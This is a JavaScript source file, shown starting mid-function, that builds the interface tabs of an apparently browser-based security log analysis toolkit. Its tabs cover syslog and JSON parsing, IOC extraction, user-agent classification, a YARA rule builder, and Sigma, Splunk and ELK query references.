    let result = `FAILED AUTHENTICATION ATTEMPTS (${entries.length} total)\n${'='.repeat(60)}\n\n`;
    const byUser = {};
    for (const e of entries) {
      const u = e.user || 'unknown';
      byUser[u] = (byUser[u] || 0) + 1;
    }
    result += 'By Username:\n';
    for (const [u, c] of Object.entries(byUser).sort((a, b) => b[1] - a[1])) {
      result += `  ${u.padEnd(20)} ${c}\n`;
    }
    result += '\nDetails:\n\n';
    for (const e of entries.slice(0, 100)) {
      result += `  User: ${e.user || 'unknown'} | IP: ${e.ip || 'unknown'}\n`;
    }
    out.textContent = result;
  };
}

function renderWindowsEventsTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">Windows Event Log Reference</h2>
    <p class="muted">Reference of ${WINDOWS_EVENTS.length} important Windows Security, System, and Sysmon event IDs for security monitoring and incident response.</p>
    <div class="tk-row" style="margin:8px 0">
      <input class="tk-f" id="la-win-search" placeholder="Search by Event ID, description, or category...">
      <select class="tk-f" id="la-win-cat" style="max-width:200px">
        <option value="">All Categories</option>
      </select>
      <select class="tk-f" id="la-win-sev" style="max-width:150px">
        <option value="">All Severities</option>
        <option value="critical">Critical</option>
        <option value="high">High</option>
        <option value="medium">Medium</option>
        <option value="info">Info</option>
      </select>
    </div>
    <div id="la-win-results"></div>
  `;
  const categories = [...new Set(WINDOWS_EVENTS.map(e => e.category))].sort();
  const catSelect = container.querySelector('#la-win-cat');
  for (const c of categories) {
    catSelect.innerHTML += `<option value="${c}">${c}</option>`;
  }

  function renderEvents() {
    const search = container.querySelector('#la-win-search').value.toLowerCase();
    const cat = container.querySelector('#la-win-cat').value;
    const sev = container.querySelector('#la-win-sev').value;
    let filtered = WINDOWS_EVENTS;
    if (search) filtered = filtered.filter(e =>
      String(e.id).includes(search) ||
      e.description.toLowerCase().includes(search) ||
      e.category.toLowerCase().includes(search)
    );
    if (cat) filtered = filtered.filter(e => e.category === cat);
    if (sev) filtered = filtered.filter(e => e.severity === sev);

    const sevColors = { critical: '#f44', high: '#f80', medium: '#fa0', info: '#4af' };
    let html = `<p class="muted">Showing ${filtered.length} of ${WINDOWS_EVENTS.length} events</p>`;
    html += '<div style="max-height:500px;overflow-y:auto">';
    for (const e of filtered) {
      html += `<div class="card" style="margin:4px 0;padding:8px 12px;border-left:3px solid ${sevColors[e.severity] || '#888'}">
        <strong style="color:${sevColors[e.severity] || '#ccc'}">${e.id}</strong>
        <span class="muted" style="margin-left:8px">[${e.category}]</span>
        <span style="margin-left:8px">${escapeHTML(e.description)}</span>
        <span class="muted" style="margin-left:8px;font-size:0.8em">${e.source} - ${e.severity}</span>
      </div>`;
    }
    html += '</div>';
    container.querySelector('#la-win-results').innerHTML = html;
  }

  container.querySelector('#la-win-search').oninput = renderEvents;
  container.querySelector('#la-win-cat').onchange = renderEvents;
  container.querySelector('#la-win-sev').onchange = renderEvents;
  renderEvents();
}

function renderSyslogTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">Syslog Parser</h2>
    <p class="muted">Parse syslog messages in RFC 3164 and RFC 5424 formats. Automatically decodes facility and severity from the priority value.</p>
    <textarea class="tk-in" id="la-syslog-input" rows="10" placeholder="Paste syslog entries here...
Example (RFC 3164):
<34>Oct 11 22:14:15 mymachine su: 'su root' failed for lonvick on /dev/pts/8

Example (RFC 5424):
<165>1 2024-10-11T22:14:15.003Z mymachine.example.com evntslog - ID47 [exampleSDID@32473 iut=&quot;3&quot;] An application event log entry"></textarea>
    <div class="tk-btns">
      <button class="btn sm" id="la-syslog-parse">Parse</button>
      <button class="btn sm" id="la-syslog-facility">By Facility</button>
      <button class="btn sm" id="la-syslog-severity">By Severity</button>
    </div>
    <pre class="tk-out" id="la-syslog-output"></pre>
  `;
  const inp = container.querySelector('#la-syslog-input');
  const out = container.querySelector('#la-syslog-output');

  container.querySelector('#la-syslog-parse').onclick = () => {
    const entries = parseSyslog(inp.value);
    if (entries.length === 0) { out.textContent = 'No entries found.'; return; }
    let result = `Parsed ${entries.length} syslog entries:\n${'='.repeat(80)}\n\n`;
    for (const e of entries) {
      result += `Format: ${e.format} | Facility: ${e.facility} | Severity: ${e.severity}\n`;
      result += `Host: ${e.hostname} | App: ${e.appname} | PID: ${e.procid}\n`;
      result += `Time: ${e.timestamp}\n`;
      result += `Message: ${e.message}\n\n`;
    }
    out.textContent = result;
  };

  container.querySelector('#la-syslog-facility').onclick = () => {
    const entries = parseSyslog(inp.value);
    const byFac = {};
    for (const e of entries) byFac[e.facility] = (byFac[e.facility] || 0) + 1;
    let result = `SYSLOG BY FACILITY\n${'='.repeat(40)}\n\n`;
    for (const [f, c] of Object.entries(byFac).sort((a, b) => b[1] - a[1])) {
      result += `${f.padEnd(15)} ${c}\n`;
    }
    out.textContent = result;
  };

  container.querySelector('#la-syslog-severity').onclick = () => {
    const entries = parseSyslog(inp.value);
    const bySev = {};
    for (const e of entries) bySev[e.severity] = (bySev[e.severity] || 0) + 1;
    let result = `SYSLOG BY SEVERITY\n${'='.repeat(40)}\n\n`;
    for (const s of SYSLOG_SEVERITIES) {
      if (bySev[s]) result += `${s.padEnd(15)} ${bySev[s]}\n`;
    }
    out.textContent = result;
  };
}

function renderJSONLogTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">JSON Log Parser</h2>
    <p class="muted">Paste JSON log lines (one JSON object per line, or a JSON array). Auto-detects fields and supports filtering and searching.</p>
    <textarea class="tk-in" id="la-json-input" rows="10" placeholder='Paste JSON log entries (one per line or array)...
Example:
{"timestamp":"2024-10-11T14:32:52Z","level":"error","message":"Connection refused","src_ip":"10.0.0.5","dest_port":443}
{"timestamp":"2024-10-11T14:32:53Z","level":"info","message":"Request processed","src_ip":"192.168.1.1","dest_port":80}'></textarea>
    <div class="tk-row" style="margin:8px 0">
      <input class="tk-f" id="la-json-filter-key" placeholder="Filter field name">
      <input class="tk-f" id="la-json-filter-val" placeholder="Filter value (regex supported)">
      <input class="tk-f" id="la-json-search" placeholder="Full-text search">
    </div>
    <div class="tk-btns">
      <button class="btn sm" id="la-json-parse">Parse</button>
      <button class="btn sm" id="la-json-fields">Detect Fields</button>
      <button class="btn sm" id="la-json-filter">Apply Filter</button>
      <button class="btn sm" id="la-json-search-btn">Search</button>
    </div>
    <pre class="tk-out" id="la-json-output"></pre>
  `;
  const inp = container.querySelector('#la-json-input');
  const out = container.querySelector('#la-json-output');

  container.querySelector('#la-json-parse').onclick = () => {
    const entries = parseJSON(inp.value);
    if (entries.length === 0) { out.textContent = 'No valid JSON entries found.'; return; }
    let result = `Parsed ${entries.length} JSON log entries:\n${'='.repeat(80)}\n\n`;
    for (const e of entries.slice(0, 50)) {
      result += JSON.stringify(e, null, 2) + '\n\n';
    }
    if (entries.length > 50) result += `... and ${entries.length - 50} more entries.\n`;
    out.textContent = result;
  };

  container.querySelector('#la-json-fields').onclick = () => {
    const entries = parseJSON(inp.value);
    if (entries.length === 0) { out.textContent = 'No valid JSON entries found.'; return; }
    const fieldCounts = {};
    const fieldTypes = {};
    const fieldSamples = {};
    for (const e of entries) {
      for (const [k, v] of Object.entries(e)) {
        fieldCounts[k] = (fieldCounts[k] || 0) + 1;
        fieldTypes[k] = typeof v;
        if (!fieldSamples[k]) fieldSamples[k] = v;
      }
    }
    let result = `DETECTED FIELDS\n${'='.repeat(60)}\n\n`;
    result += `${'Field'.padEnd(25)} ${'Type'.padEnd(12)} ${'Count'.padEnd(8)} Sample\n`;
    result += `${'-'.repeat(25)} ${'-'.repeat(12)} ${'-'.repeat(8)} ${'-'.repeat(30)}\n`;
    for (const [k, c] of Object.entries(fieldCounts).sort((a, b) => b[1] - a[1])) {
      const sample = String(fieldSamples[k]).substring(0, 30);
      result += `${k.padEnd(25)} ${fieldTypes[k].padEnd(12)} ${String(c).padEnd(8)} ${sample}\n`;
    }
    out.textContent = result;
  };

  container.querySelector('#la-json-filter').onclick = () => {
    const entries = parseJSON(inp.value);
    const key = container.querySelector('#la-json-filter-key').value.trim();
    const val = container.querySelector('#la-json-filter-val').value.trim();
    if (!key) { out.textContent = 'Enter a field name to filter on.'; return; }
    const re = new RegExp(val, 'i');
    const filtered = entries.filter(e => e[key] !== undefined && re.test(String(e[key])));
    let result = `Filtered ${filtered.length} of ${entries.length} entries where "${key}" matches "${val}":\n\n`;
    for (const e of filtered.slice(0, 50)) {
      result += JSON.stringify(e, null, 2) + '\n\n';
    }
    out.textContent = result;
  };

  container.querySelector('#la-json-search-btn').onclick = () => {
    const entries = parseJSON(inp.value);
    const q = container.querySelector('#la-json-search').value.trim();
    if (!q) { out.textContent = 'Enter a search term.'; return; }
    const re = new RegExp(q, 'i');
    const matched = entries.filter(e => re.test(JSON.stringify(e)));
    let result = `Search "${q}": ${matched.length} of ${entries.length} entries matched:\n\n`;
    for (const e of matched.slice(0, 50)) {
      result += JSON.stringify(e, null, 2) + '\n\n';
    }
    out.textContent = result;
  };
}

function renderPatternDetectorTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">Log Pattern Detector</h2>
    <p class="muted">Paste access logs to detect anomalies including unusual activity times, burst traffic, scanning patterns, sequential access, SQL injection attempts, XSS attempts, and path traversal.</p>
    <textarea class="tk-in" id="la-pattern-input" rows="10" placeholder="Paste access log lines for pattern detection..."></textarea>
    <div class="tk-btns">
      <button class="btn sm" id="la-pattern-detect">Detect All Patterns</button>
    </div>
    <pre class="tk-out" id="la-pattern-output"></pre>
  `;
  const inp = container.querySelector('#la-pattern-input');
  const out = container.querySelector('#la-pattern-output');

  container.querySelector('#la-pattern-detect').onclick = () => {
    const entries = parseApacheAccess(inp.value);
    if (entries.length === 0) { out.textContent = 'No valid access log entries. Use Apache/Nginx combined format.'; return; }
    const findings = detectPatterns(entries);
    if (findings.length === 0) {
      out.textContent = `Analyzed ${entries.length} entries. No suspicious patterns detected.`;
      return;
    }
    let result = `PATTERN DETECTION RESULTS\n${'='.repeat(60)}\n`;
    result += `Analyzed ${entries.length} log entries\n`;
    result += `Found ${findings.length} alerts\n\n`;
    const bySev = {};
    for (const f of findings) {
      if (!bySev[f.severity]) bySev[f.severity] = [];
      bySev[f.severity].push(f);
    }
    for (const sev of ['critical', 'high', 'medium', 'low']) {
      if (!bySev[sev]) continue;
      result += `\n[${sev.toUpperCase()}] (${bySev[sev].length} findings)\n${'-'.repeat(40)}\n`;
      for (const f of bySev[sev]) {
        result += `  Type: ${f.type} | ${f.message}\n`;
      }
    }
    out.textContent = result;
  };
}

function renderIPFrequencyTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">IP Frequency Counter</h2>
    <p class="muted">Paste any text containing IP addresses. Extracts and counts all IPv4 addresses, sorted by frequency. Useful for finding top talkers in any log format.</p>
    <textarea class="tk-in" id="la-ipfreq-input" rows="10" placeholder="Paste any text containing IP addresses..."></textarea>
    <div class="tk-row" style="margin:8px 0">
      <label class="muted">Highlight threshold: </label>
      <input class="tk-f" id="la-ipfreq-thresh" type="number" value="10" min="1" style="width:80px">
    </div>
    <div class="tk-btns">
      <button class="btn sm" id="la-ipfreq-count">Count IPs</button>
    </div>
    <pre class="tk-out" id="la-ipfreq-output"></pre>
  `;
  container.querySelector('#la-ipfreq-count').onclick = () => {
    const text = container.querySelector('#la-ipfreq-input').value;
    const threshold = parseInt(container.querySelector('#la-ipfreq-thresh').value, 10) || 10;
    const freq = countIPFrequency(text);
    if (freq.length === 0) {
      container.querySelector('#la-ipfreq-output').textContent = 'No IP addresses found.';
      return;
    }
    const total = freq.reduce((s, f) => s + f.count, 0);
    let result = `IP FREQUENCY ANALYSIS\n${'='.repeat(60)}\n\n`;
    result += `Total IPs found: ${total}\nUnique IPs: ${freq.length}\n\n`;
    result += `${'IP Address'.padEnd(20)} ${'Count'.padEnd(10)} ${'Percent'.padEnd(10)} Note\n`;
    result += `${'-'.repeat(20)} ${'-'.repeat(10)} ${'-'.repeat(10)} ${'-'.repeat(15)}\n`;
    for (const { ip, count } of freq) {
      const pct = (count / total * 100).toFixed(1);
      const note = count >= threshold ? ' << HIGH' : '';
      result += `${ip.padEnd(20)} ${String(count).padEnd(10)} ${(pct + '%').padEnd(10)}${note}\n`;
    }
    container.querySelector('#la-ipfreq-output').textContent = result;
  };
}

function renderUserAgentTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">User Agent Parser & Classifier</h2>
    <p class="muted">Paste user agent strings (one per line) to identify browsers, bots, attack tools, and libraries. Detects ${KNOWN_USER_AGENTS.length} known user agent patterns.</p>
    <textarea class="tk-in" id="la-ua-input" rows="10" placeholder="Paste user agent strings (one per line)...
Example:
Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
sqlmap/1.6.12#stable (https://sqlmap.org)
Googlebot/2.1 (+http://www.google.com/bot.html)"></textarea>
    <div class="tk-btns">
      <button class="btn sm" id="la-ua-classify">Classify All</button>
    </div>
    <pre class="tk-out" id="la-ua-output"></pre>
  `;
  container.querySelector('#la-ua-classify').onclick = () => {
    const lines = container.querySelector('#la-ua-input').value.split('\n').filter(l => l.trim());
    if (lines.length === 0) { container.querySelector('#la-ua-output').textContent = 'Paste user agent strings.'; return; }
    let result = `USER AGENT CLASSIFICATION\n${'='.repeat(60)}\n\n`;
    const categories = {};
    for (const ua of lines) {
      const cls = classifyUserAgent(ua);
      if (!categories[cls.category]) categories[cls.category] = [];
      categories[cls.category].push({ ua, label: cls.label });
    }
    for (const [cat, items] of Object.entries(categories)) {
      const flag = cat === 'attack-tool' ? ' [WARNING]' : '';
      result += `--- ${cat.toUpperCase()}${flag} (${items.length}) ---\n`;
      for (const item of items) {
        result += `  ${item.label}\n    ${item.ua}\n`;
      }
      result += '\n';
    }
    container.querySelector('#la-ua-output').textContent = result;
  };
}

function renderRegexBuilderTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">Regex Log Search Builder</h2>
    <p class="muted">Build regex patterns for log searching. Choose from ${REGEX_PRESETS.length} presets or construct custom patterns. Test against sample text.</p>
    <div class="tk-row" style="margin:8px 0">
      <select class="tk-f" id="la-regex-preset" style="max-width:250px">
        <option value="">-- Select Preset --</option>
        ${REGEX_PRESETS.map((p, i) => `<option value="${i}">${escapeHTML(p.name)}</option>`).join('')}
      </select>
      <button class="btn sm" id="la-regex-load">Load Preset</button>
    </div>
    <div class="tk-row" style="margin:8px 0">
      <input class="tk-f" id="la-regex-pattern" placeholder="Enter regex pattern...">
      <select class="tk-f" id="la-regex-flags" style="max-width:120px">
        <option value="gi">Global + Case-insensitive</option>
        <option value="g">Global</option>
        <option value="i">Case-insensitive</option>
        <option value="gm">Global + Multiline</option>
        <option value="gim">All flags</option>
      </select>
    </div>
    <textarea class="tk-in" id="la-regex-text" rows="8" placeholder="Paste text to test the regex against..."></textarea>
    <div class="tk-btns">
      <button class="btn sm" id="la-regex-test">Test Regex</button>
      <button class="btn sm" id="la-regex-extract">Extract Matches</button>
    </div>
    <pre class="tk-out" id="la-regex-output"></pre>
  `;

  container.querySelector('#la-regex-load').onclick = () => {
    const idx = container.querySelector('#la-regex-preset').value;
    if (idx === '') return;
    const preset = REGEX_PRESETS[parseInt(idx, 10)];
    container.querySelector('#la-regex-pattern').value = preset.pattern;
    container.querySelector('#la-regex-output').textContent = `Loaded: ${preset.name}\n${preset.description}\nPattern: ${preset.pattern}`;
  };

  container.querySelector('#la-regex-test').onclick = () => {
    const pattern = container.querySelector('#la-regex-pattern').value;
    const flags = container.querySelector('#la-regex-flags').value;
    const text = container.querySelector('#la-regex-text').value;
    if (!pattern) { container.querySelector('#la-regex-output').textContent = 'Enter a regex pattern.'; return; }
    try {
      const re = new RegExp(pattern, flags);
      const matches = [];
      let m;
      while ((m = re.exec(text)) !== null) {
        matches.push({ match: m[0], index: m.index, groups: m.slice(1) });
        if (!re.global) break;
      }
      let result = `Regex: /${pattern}/${flags}\nMatches found: ${matches.length}\n${'='.repeat(60)}\n\n`;
      for (let i = 0; i < matches.length && i < 200; i++) {
        result += `Match ${i + 1}: "${matches[i].match}" at position ${matches[i].index}`;
        if (matches[i].groups.length > 0) {
          result += `\n  Groups: ${matches[i].groups.map((g, j) => `$${j + 1}="${g || ''}"`).join(', ')}`;
        }
        result += '\n';
      }
      container.querySelector('#la-regex-output').textContent = result;
    } catch (e) {
      container.querySelector('#la-regex-output').textContent = `Invalid regex: ${e.message}`;
    }
  };

  container.querySelector('#la-regex-extract').onclick = () => {
    const pattern = container.querySelector('#la-regex-pattern').value;
    const flags = container.querySelector('#la-regex-flags').value;
    const text = container.querySelector('#la-regex-text').value;
    if (!pattern) { container.querySelector('#la-regex-output').textContent = 'Enter a regex pattern.'; return; }
    try {
      const re = new RegExp(pattern, flags);
      const all = text.match(re) || [];
      const unique = [...new Set(all)];
      let result = `EXTRACTED MATCHES\n${'='.repeat(60)}\n\n`;
      result += `Total matches: ${all.length}\nUnique matches: ${unique.length}\n\n`;
      for (const u of unique) {
        const count = all.filter(x => x === u).length;
        result += `${count > 1 ? '(' + count + 'x) ' : ''}${u}\n`;
      }
      container.querySelector('#la-regex-output').textContent = result;
    } catch (e) {
      container.querySelector('#la-regex-output').textContent = `Invalid regex: ${e.message}`;
    }
  };
}

function renderIOCExtractorTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">IOC Extractor</h2>
    <p class="muted">Extract Indicators of Compromise (IOCs) from any text. Finds IPv4 addresses, IPv6 addresses, domain names, URLs, email addresses, MD5 hashes, SHA1 hashes, and SHA256 hashes.</p>
    <textarea class="tk-in" id="la-ioc-input" rows="10" placeholder="Paste any text to extract IOCs...
The tool will find IPs, domains, URLs, emails, and hashes."></textarea>
    <div class="tk-btns">
      <button class="btn sm" id="la-ioc-extract">Extract All IOCs</button>
      <button class="btn sm" id="la-ioc-ips">IPs Only</button>
      <button class="btn sm" id="la-ioc-domains">Domains Only</button>
      <button class="btn sm" id="la-ioc-hashes">Hashes Only</button>
      <button class="btn sm" id="la-ioc-urls">URLs Only</button>
    </div>
    <pre class="tk-out" id="la-ioc-output"></pre>
  `;
  const inp = container.querySelector('#la-ioc-input');
  const out = container.querySelector('#la-ioc-output');

  container.querySelector('#la-ioc-extract').onclick = () => {
    const iocs = extractIOCs(inp.value);
    let result = `IOC EXTRACTION RESULTS\n${'='.repeat(60)}\n\n`;
    const sections = [
      ['IPv4 Addresses', iocs.ips4],
      ['IPv6 Addresses', iocs.ips6],
      ['Domain Names', iocs.domains],
      ['URLs', iocs.urls],
      ['Email Addresses', iocs.emails],
      ['MD5 Hashes', iocs.md5s],
      ['SHA1 Hashes', iocs.sha1s],
      ['SHA256 Hashes', iocs.sha256s],
    ];
    let totalCount = 0;
    for (const [name, items] of sections) totalCount += items.length;
    result += `Total IOCs found: ${totalCount}\n\n`;
    for (const [name, items] of sections) {
      if (items.length > 0) {
        result += `--- ${name} (${items.length}) ---\n`;
        for (const item of items) result += `  ${item}\n`;
        result += '\n';
      }
    }
    if (totalCount === 0) result += 'No IOCs found in the provided text.\n';
    out.textContent = result;
  };

  container.querySelector('#la-ioc-ips').onclick = () => {
    const iocs = extractIOCs(inp.value);
    const all = [...iocs.ips4, ...iocs.ips6];
    out.textContent = all.length > 0 ? `IP Addresses (${all.length}):\n\n${all.join('\n')}` : 'No IP addresses found.';
  };

  container.querySelector('#la-ioc-domains').onclick = () => {
    const iocs = extractIOCs(inp.value);
    out.textContent = iocs.domains.length > 0 ? `Domains (${iocs.domains.length}):\n\n${iocs.domains.join('\n')}` : 'No domains found.';
  };

  container.querySelector('#la-ioc-hashes').onclick = () => {
    const iocs = extractIOCs(inp.value);
    let result = '';
    if (iocs.md5s.length > 0) result += `MD5 (${iocs.md5s.length}):\n${iocs.md5s.join('\n')}\n\n`;
    if (iocs.sha1s.length > 0) result += `SHA1 (${iocs.sha1s.length}):\n${iocs.sha1s.join('\n')}\n\n`;
    if (iocs.sha256s.length > 0) result += `SHA256 (${iocs.sha256s.length}):\n${iocs.sha256s.join('\n')}\n\n`;
    out.textContent = result || 'No hashes found.';
  };

  container.querySelector('#la-ioc-urls').onclick = () => {
    const iocs = extractIOCs(inp.value);
    out.textContent = iocs.urls.length > 0 ? `URLs (${iocs.urls.length}):\n\n${iocs.urls.join('\n')}` : 'No URLs found.';
  };
}

function renderSigmaTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">Sigma Rule Reference</h2>
    <p class="muted">${SIGMA_RULES.length} Sigma detection rules for security monitoring. Sigma is a generic signature format for SIEM systems.</p>
    <div class="tk-row" style="margin:8px 0">
      <input class="tk-f" id="la-sigma-search" placeholder="Search rules by title, description, tag, or ID...">
      <select class="tk-f" id="la-sigma-level" style="max-width:150px">
        <option value="">All Levels</option>
        <option value="critical">Critical</option>
        <option value="high">High</option>
        <option value="medium">Medium</option>
        <option value="low">Low</option>
      </select>
    </div>
    <div id="la-sigma-results" style="max-height:600px;overflow-y:auto"></div>
  `;

  function renderRules() {
    const search = container.querySelector('#la-sigma-search').value.toLowerCase();
    const level = container.querySelector('#la-sigma-level').value;
    let filtered = SIGMA_RULES;
    if (search) filtered = filtered.filter(r =>
      r.title.toLowerCase().includes(search) ||
      r.description.toLowerCase().includes(search) ||
      r.tags.some(t => t.toLowerCase().includes(search)) ||
      r.id.toLowerCase().includes(search)
    );
    if (level) filtered = filtered.filter(r => r.level === level);

    const levColors = { critical: '#f44', high: '#f80', medium: '#fa0', low: '#4af' };
    let html = `<p class="muted">Showing ${filtered.length} of ${SIGMA_RULES.length} rules</p>`;
    for (const r of filtered) {
      html += `<div class="card" style="margin:8px 0;padding:12px;border-left:3px solid ${levColors[r.level] || '#888'}">
        <div style="display:flex;justify-content:space-between;align-items:center">
          <strong>${escapeHTML(r.title)}</strong>
          <span class="muted">${r.id} | ${r.level.toUpperCase()}</span>
        </div>
        <p class="muted" style="margin:4px 0">${escapeHTML(r.description)}</p>
        <div style="margin:4px 0"><strong>Log Source:</strong> ${escapeHTML(r.logsource)}</div>
        <div style="margin:4px 0"><strong>Detection:</strong> ${escapeHTML(r.detection)}</div>
        <div style="margin:4px 0"><strong>False Positives:</strong> ${escapeHTML(r.falsepositives)}</div>
        <div style="margin:4px 0"><strong>Example:</strong> <code class="mono" style="font-size:0.85em">${escapeHTML(r.example)}</code></div>
        <div style="margin:4px 0">${r.tags.map(t => `<span style="display:inline-block;padding:1px 6px;margin:2px;background:#333;border-radius:3px;font-size:0.8em">${escapeHTML(t)}</span>`).join('')}</div>
      </div>`;
    }
    container.querySelector('#la-sigma-results').innerHTML = html;
  }

  container.querySelector('#la-sigma-search').oninput = renderRules;
  container.querySelector('#la-sigma-level').onchange = renderRules;
  renderRules();
}

function renderYARATab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">YARA Rule Reference & Builder</h2>
    <p class="muted">${YARA_RULES.length} pre-built YARA rules for malware detection. Browse rules or build your own.</p>
    <div class="tab-bar" id="la-yara-subtabs">
      <button class="tab active" data-sub="reference">Rule Reference</button>
      <button class="tab" data-sub="builder">Rule Builder</button>
    </div>
    <div id="la-yara-content"></div>
  `;

  const subtabs = container.querySelector('#la-yara-subtabs');
  const content = container.querySelector('#la-yara-content');

  function showYARAReference() {
    let html = `
      <div class="tk-row" style="margin:8px 0">
        <input class="tk-f" id="la-yara-search" placeholder="Search YARA rules...">
      </div>
      <div id="la-yara-list" style="max-height:500px;overflow-y:auto"></div>
    `;
    content.innerHTML = html;

    function renderList() {
      const q = content.querySelector('#la-yara-search').value.toLowerCase();
      let filtered = YARA_RULES;
      if (q) filtered = filtered.filter(r =>
        r.name.toLowerCase().includes(q) || r.description.toLowerCase().includes(q)
      );
      let listHTML = '';
      for (const r of filtered) {
        listHTML += `<div class="card" style="margin:8px 0;padding:12px">
          <strong>${escapeHTML(r.name)}</strong>
          <p class="muted" style="margin:4px 0">${escapeHTML(r.description)}</p>
          <pre class="cmd-block" style="margin:4px 0;font-size:0.85em;max-height:300px;overflow-y:auto">${escapeHTML(r.rule)}</pre>
        </div>`;
      }
      content.querySelector('#la-yara-list').innerHTML = listHTML || '<p class="muted">No rules match.</p>';
    }
    setTimeout(() => {
      const searchEl = content.querySelector('#la-yara-search');
      if (searchEl) searchEl.oninput = renderList;
      renderList();
    }, 0);
  }

  function showYARABuilder() {
    content.innerHTML = `
      <div class="card" style="padding:16px;margin:8px 0">
        <h3>YARA Rule Builder</h3>
        <div class="tk-row" style="margin:8px 0">
          <label style="width:100px">Rule Name:</label>
          <input class="tk-f" id="yb-name" placeholder="My_Rule" value="Custom_Detection">
        </div>
        <div class="tk-row" style="margin:8px 0">
          <label style="width:100px">Description:</label>
          <input class="tk-f" id="yb-desc" placeholder="Description of what this rule detects" value="Custom YARA detection rule">
        </div>
        <div class="tk-row" style="margin:8px 0">
          <label style="width:100px">Author:</label>
          <input class="tk-f" id="yb-author" placeholder="Your name" value="Analyst">
        </div>
        <div class="tk-row" style="margin:8px 0">
          <label style="width:100px">Severity:</label>
          <select class="tk-f" id="yb-severity" style="max-width:150px">
            <option value="low">Low</option>
            <option value="medium" selected>Medium</option>
            <option value="high">High</option>
            <option value="critical">Critical</option>
          </select>
        </div>
        <div style="margin:12px 0">
          <label><strong>Strings (one per line, format: $name = "value" or $name = {hex}):</strong></label>
          <textarea class="tk-in" id="yb-strings" rows="6" placeholder='$s1 = "malicious_string" ascii nocase
$s2 = "another_pattern" ascii
$hex1 = { 4D 5A 90 00 }'></textarea>
        </div>
        <div style="margin:12px 0">
          <label><strong>Condition:</strong></label>
          <input class="tk-f" id="yb-condition" placeholder="any of them" value="any of them">
          <p class="muted" style="font-size:0.85em;margin:4px 0">Examples: "any of them", "2 of ($s*)", "all of them", "$s1 and ($s2 or $s3)", "uint16(0) == 0x5A4D and any of them"</p>
        </div>
        <div class="tk-btns">
          <button class="btn sm" id="yb-generate">Generate Rule</button>
          <button class="btn sm" id="yb-copy">Copy to Clipboard</button>
        </div>
        <pre class="tk-out" id="yb-output"></pre>
      </div>
    `;

    content.querySelector('#yb-generate').onclick = () => {
      const name = content.querySelector('#yb-name').value.trim().replace(/\s+/g, '_') || 'Custom_Rule';
      const desc = content.querySelector('#yb-desc').value.trim();
      const author = content.querySelector('#yb-author').value.trim();
      const severity = content.querySelector('#yb-severity').value;
      const stringsText = content.querySelector('#yb-strings').value.trim();
      const condition = content.querySelector('#yb-condition').value.trim() || 'any of them';

      let rule = `rule ${name} {\n`;
      rule += `    meta:\n`;
      rule += `        description = "${desc}"\n`;
      rule += `        author = "${author}"\n`;
      rule += `        severity = "${severity}"\n`;
      rule += `        date = "${new Date().toISOString().split('T')[0]}"\n`;
      if (stringsText) {
        rule += `    strings:\n`;
        for (const line of stringsText.split('\n').filter(l => l.trim())) {
          rule += `        ${line.trim()}\n`;
        }
      }
      rule += `    condition:\n`;
      rule += `        ${condition}\n`;
      rule += `}`;

      content.querySelector('#yb-output').textContent = rule;
    };

    content.querySelector('#yb-copy').onclick = () => {
      const text = content.querySelector('#yb-output').textContent;
      if (text) {
        navigator.clipboard.writeText(text).then(() => {
          content.querySelector('#yb-copy').textContent = 'Copied';
          setTimeout(() => { content.querySelector('#yb-copy').textContent = 'Copy to Clipboard'; }, 1500);
        });
      }
    };
  }

  subtabs.onclick = (e) => {
    const btn = e.target.closest('.tab');
    if (!btn) return;
    subtabs.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    btn.classList.add('active');
    if (btn.dataset.sub === 'reference') showYARAReference();
    else showYARABuilder();
  };

  showYARAReference();
}

function renderSplunkTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">Splunk SPL Query Reference</h2>
    <p class="muted">${SPLUNK_QUERIES.length} ready-to-use Splunk SPL queries for security monitoring, incident response, and threat hunting.</p>
    <div class="tk-row" style="margin:8px 0">
      <input class="tk-f" id="la-splunk-search" placeholder="Search queries...">
      <select class="tk-f" id="la-splunk-cat" style="max-width:200px">
        <option value="">All Categories</option>
        ${[...new Set(SPLUNK_QUERIES.map(q => q.category))].sort().map(c => `<option value="${c}">${c}</option>`).join('')}
      </select>
    </div>
    <div id="la-splunk-list" style="max-height:600px;overflow-y:auto"></div>
  `;

  function renderQueries() {
    const search = container.querySelector('#la-splunk-search').value.toLowerCase();
    const cat = container.querySelector('#la-splunk-cat').value;
    let filtered = SPLUNK_QUERIES;
    if (search) filtered = filtered.filter(q =>
      q.title.toLowerCase().includes(search) || q.description.toLowerCase().includes(search) || q.query.toLowerCase().includes(search)
    );
    if (cat) filtered = filtered.filter(q => q.category === cat);

    let html = `<p class="muted">Showing ${filtered.length} of ${SPLUNK_QUERIES.length} queries</p>`;
    for (const q of filtered) {
      html += `<div class="card" style="margin:8px 0;padding:12px">
        <div style="display:flex;justify-content:space-between"><strong>${escapeHTML(q.title)}</strong><span class="muted">${q.category}</span></div>
        <p class="muted" style="margin:4px 0">${escapeHTML(q.description)}</p>
        <pre class="cmd-block" style="margin:4px 0;font-size:0.85em;white-space:pre-wrap;word-break:break-all">${escapeHTML(q.query)}</pre>
      </div>`;
    }
    container.querySelector('#la-splunk-list').innerHTML = html;
  }

  container.querySelector('#la-splunk-search').oninput = renderQueries;
  container.querySelector('#la-splunk-cat').onchange = renderQueries;
  renderQueries();
}

function renderELKTab(container) {
  container.innerHTML = `
    <h2 class="pg-h2">ELK / Kibana Query Reference</h2>
    <p class="muted">${ELK_QUERIES.length} ready-to-use Elasticsearch and Kibana Query Language (KQL) queries for security monitoring with the Elastic Stack.</p>
    <div class="tk-row" style="margin:8px 0">
      <input class="tk-f" id="la-elk-search" placeholder="Search queries...">
      <select class="tk-f" id="la-elk-cat" style="max-width:200px">
        <option value="">All Categories</option>
        ${[...new Set(ELK_QUERIES.map(q => q.category))].sort().map(c => `<option value="${c}">${c}</option>`).join('')}
      </select>
    </div>
